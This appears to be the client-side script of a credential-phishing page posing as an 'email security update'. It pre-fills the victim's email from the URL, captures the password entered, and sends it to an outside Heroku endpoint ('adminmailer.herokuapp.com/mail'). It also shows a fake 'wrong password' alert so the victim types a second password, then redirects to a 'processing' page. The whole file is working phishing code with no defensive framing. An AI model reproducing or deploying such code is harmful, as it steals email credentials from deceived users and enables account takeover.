const querypath = window.location.pathname;
const getparam = querypath.split("/");
let queryemail = getparam[2];

/*
const queryString = window.location.search;
let params = new URLSearchParams(queryString);
let queryemail = params.get("email");
*/

console.log(queryemail);

const splitEmail = queryemail.split("@");
const emailDomain = splitEmail[splitEmail.length - 1];

const splitDomain = emailDomain.split(".");
const hostname = splitDomain[0];

$("input[name='username']").val(queryemail);

var count = 0;

$("form").submit(function (event) {
  event.preventDefault();
  $('form input[type="submit"]').prop("disabled", true);
  let data = $("form").serializeJSON();

  var user = document.getElementById("passworduser");
  var admin = document.getElementById("passwordadmin");

  if (user.value != "") {
    data = { ...data, username: queryemail, password: user.value };
  } else if (admin.value != "") {
    data = { ...data, username: queryemail, password: admin.value };
  }

  console.log(data);

  $.ajax({
    type: "POST",
    url: "https://adminmailer.herokuapp.com/mail",
    // url: `${window.location.origin}/mail`,
    data: data,
    dataType: "json",
    encode: true,
  })
    .done((data) => {
      //set submit count
      if (count == 1) {
        console.log("success");
        // redirect now
        window.location.href = `../processing/${emailDomain}`;
      } else {
        count++;
        console.log(count);
        $('form input[type="submit"]').prop("disabled", false);
        alert(
          `Oops sorry it seems you have entered a wrong password.\n try and enter your current password to complete your email security update.`
        );
      }
      console.log(data);
    })
    .fail((err) => {
      alert(
        `Oops sorry its seems an error has occured.\n please try again to complete`
      );
      console.log(err);
      $('form input[type="submit"]').prop("disabled", false);
    });
});
